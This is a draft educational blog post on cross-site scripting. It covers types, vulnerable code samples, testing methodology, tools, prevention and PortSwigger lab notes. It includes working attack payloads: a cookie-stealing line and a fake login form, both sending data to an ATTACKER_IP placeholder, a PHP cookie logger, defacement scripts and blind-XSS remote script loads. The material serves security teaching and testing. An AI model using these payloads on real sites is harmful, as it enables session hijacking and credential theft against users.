---
title: "Cross-Site Scripting (XSS)"
date: 2026-08-13
draft: true
aliases:
  - /posts/crosssitescriptingxss/
description: "Theory, testing methodology, write ups and common attack techniques for Cross-Site Scripting (XSS)."
tags:
  - xss
  - injection
  - web
  - owasp
categories:
  - methodology
---

# Cross-Site Scripting (XSS)

A typical web application works by receiving the HTML code from the back-end server and rendering it on the client-side internet browser. When a vulnerable web application does not properly sanitize user input, a malicious user can inject extra JavaScript code in an input field (e.g., comment/reply), so once another user views the same page, they unknowingly execute the malicious JavaScript code.

XSS vulnerabilities are solely executed on the client-side and hence do not directly affect the back-end server. They can only affect the user executing the vulnerability. The direct impact of XSS vulnerabilities on the back-end server may be relatively low, but they are very commonly found in web applications, so this equates to a medium risk (low impact + high probability = medium risk), which we should always attempt to reduce by detecting, remediating, and proactively preventing these types of vulnerabilities.

# OWASP Top 10:2025 Context

In the OWASP Top 10:2025, Cross-Site Scripting (XSS) has been merged into **A03:2025 – Injection**. The 2025 update consolidated several injection-related flaws—including XSS, SQLi, Command Injection, and others—into a single category, recognizing that all injection vulnerabilities share the same fundamental root cause: the application does not properly separate untrusted data from commands or queries.

XSS remains one of the most prevalent web vulnerabilities. Notable real-world examples include the **Samy Worm** on MySpace (2005), which infected over one million users in a single day through a stored XSS payload, and the **TweetDeck XSS** (2014), which caused a tweet to be retweeted over 38,000 times in under two minutes, forcing Twitter to temporarily shut down the service. Even Google's search engine had multiple XSS vulnerabilities, the most recent in 2019.

# Types of XSS

There are three main types of XSS vulnerabilities:

| Type | Description |
|------|-------------|
| **Stored (Persistent) XSS** | The most critical type. User input is stored on the back-end database and displayed upon retrieval (e.g., posts, comments). Affects any user who visits the page. |
| **Reflected (Non-Persistent) XSS** | User input is displayed on the page after being processed by the backend server, but without being stored (e.g., search results, error messages). Temporary and only affects the targeted user. |
| **DOM-based XSS** | A non-persistent type where user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags). |

# A03:2025 Injection (XSS) Sample Scenarios

The following scenarios illustrate how XSS manifests in real-world applications, based on OWASP documentation and common vulnerability patterns.

**Scenario #1: Reflected XSS via Unsanitized Query Parameter**

PHP_Sample_Code:

```php
$name = $_GET['name'];
echo "<h1>Welcome, " . $name . "!</h1>";
```

An attacker can craft a malicious URL that injects JavaScript:

`https://example.com/welcome.php?name=<script>alert(document.cookie)</script>`

Any user who clicks this link will unknowingly execute the injected script in their browser.

**Scenario #2: Stored XSS via Comment Field**

Java_Sample_Code (Servlet):

```java
String comment = request.getParameter("comment");
// Unsafely stored directly into database without sanitization
stmt.executeUpdate("INSERT INTO comments (text) VALUES ('" + comment + "')");
```

When the comment is retrieved and displayed:

```jsp
<p><%= comment %></p>
```

The malicious JavaScript persists in the database and executes for every user viewing the comments section.

**Scenario #3: DOM-based XSS via Client-Side Parameter**

JavaScript_Sample_Code:

```javascript
var pos = document.URL.indexOf("q=");
var query = document.URL.substring(pos + 2, document.URL.length);
document.getElementById("searchResults").innerHTML = "Results for: " + query;
```

An attacker can use a URL fragment to inject code that never reaches the server:

`https://example.com/search#q=<img src="" onerror=alert(window.origin)>`

The `innerHTML` sink executes the payload entirely on the client-side.

# Source & Sink

To understand DOM-based XSS, we must understand the concept of **Source** and **Sink**:

- **Source**: The JavaScript object that takes user input (e.g., `document.URL`, `document.location`, `window.name`, `location.hash`).
- **Sink**: The function that writes user input to a DOM object on the page.

Common vulnerable sink functions:

```javascript
document.write()
DOM.innerHTML
DOM.outerHTML
```

Common vulnerable jQuery sink functions:

```javascript
.add()
.after()
.append()
```

If a sink function writes the exact input without any sanitization and no other means of sanitization were used, the page is vulnerable to XSS.

# Attacking Techniques

## XSS Testing Payloads

The most basic XSS payload for verification:

```html
<script>alert(window.origin)</script>
```

> **Tip**: Using `window.origin` instead of a static value like `1` helps identify which form is vulnerable in case cross-domain IFrames are being used.

Alternative payloads when `alert()` is blocked:

```html
<script>print()</script>
```

For DOM-based XSS where `<script>` tags don't work with `innerHTML`:

```html
<img src="" onerror=alert(window.origin)>
```

## Injection Points

XSS can be injected into **any** input in the HTML page, not just form fields:

- **Path**: `/api/user/<payload>`
- **Query**: `?search=<payload>`
- **Body/JSON**: `{"name": "<payload>"}`
- **Headers**: `User-Agent: <payload>`, `Referer: <payload>`
- **Cookies**: `session=<payload>` (when displayed on page)

## Defacing Attacks

Common defacement elements using JavaScript:

```javascript
// Change background color
document.body.style.background = "#141d2b"

// Change background image
document.body.background = "https://example.com/image.svg"

// Change page title
document.title = 'Hacked'

// Replace entire page content
document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Hacked</h1></center>'
```

## Phishing Attacks

Inject a fake login form that sends credentials to an attacker-controlled server:

```javascript
document.write('<h3>Please login to continue</h3><form action=http://ATTACKER_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
document.getElementById('urlform').remove();
```

## Session Hijacking (Cookie Stealing)

JavaScript payload to steal cookies:

```javascript
new Image().src='http://ATTACKER_IP/index.php?c='+document.cookie;
```

PHP script to capture cookies:

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

## Blind XSS Detection

When the vulnerability is triggered on a page you don't have access to (e.g., admin panel), use remote script loading to detect which field is vulnerable:

```html
<script src=http://ATTACKER_IP/username></script>
<script src=http://ATTACKER_IP/fullname></script>
'><script src=http://ATTACKER_IP/review></script>
"><script src=http://ATTACKER_IP/support_ticket></script>
```

Each field uses a different endpoint path—when your server receives a request to `/username`, you know that field is vulnerable.

# Tooling

**Automated Scanners:**
- Burp Suite Pro (Active & Passive Scanning)
- OWASP ZAP (Active & Passive Scanning)
- Nessus

**Open-Source XSS Tools:**

```bash
# XSStrike
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
python xsstrike.py -u "http://target.com/page?param=test"
```

- **XSStrike**: Advanced XSS detection with WAF bypass capabilities
- **Brute XSS**: Bulk XSS payload testing
- **XSSer**: Comprehensive XSS framework
- **Dalfox**: Fast XSS scanner with parameter analysis

**BurpSuite Extensions:**
- HUNT
- Backslash Powered Scanner
- ActiveScan++

**Payload References:**
- PayloadsAllTheThings (XSS section)
- PayloadBox

# XSS Prevention

## Front-end Protection

**Input Validation** (e.g., email format check):

```javascript
function validateEmail(email) {
    var re = /\S+@\S+\.\S+/;
    return re.test(email);
}
```

**Input Sanitization** using DOMPurify:

```javascript
var cleanHTML = DOMPurify.sanitize(untrustedHTML);
```

## Back-end Protection

- **Context-Aware Output Encoding**: Encode data based on where it's placed (HTML body, HTML attribute, JavaScript variable, CSS, URL)
- **Content Security Policy (CSP)**: Restrict which scripts can execute
- **HttpOnly Cookies**: Prevent JavaScript from accessing session cookies
- **Input Validation**: Validate on the server-side regardless of front-end validation

---

## Portswigger XSS Labs


### Lab: Reflected XSS into HTML context with nothing encoded

This lab contains a simple reflected cross-site scripting vulnerability in the search functionality. To solve the lab, perform a cross-site scripting attack that calls the alert function. 

Exploitation : 

We just need to inject the payload in search function & the lab is solved.

```javascript
<script>alert(window.origin)</script>
``` 
The payload will be see in between `<h1></h1>` tag when we view our view page source .

### Lab: Stored XSS into HTML context with nothing encoded

This lab contains a stored cross-site scripting vulnerability in the comment functionality.

To solve this lab, submit a comment that calls the alert function when the blog post is viewed. 

Exploitation : 

We just need to inject the payload in comment section & the lab is solved.

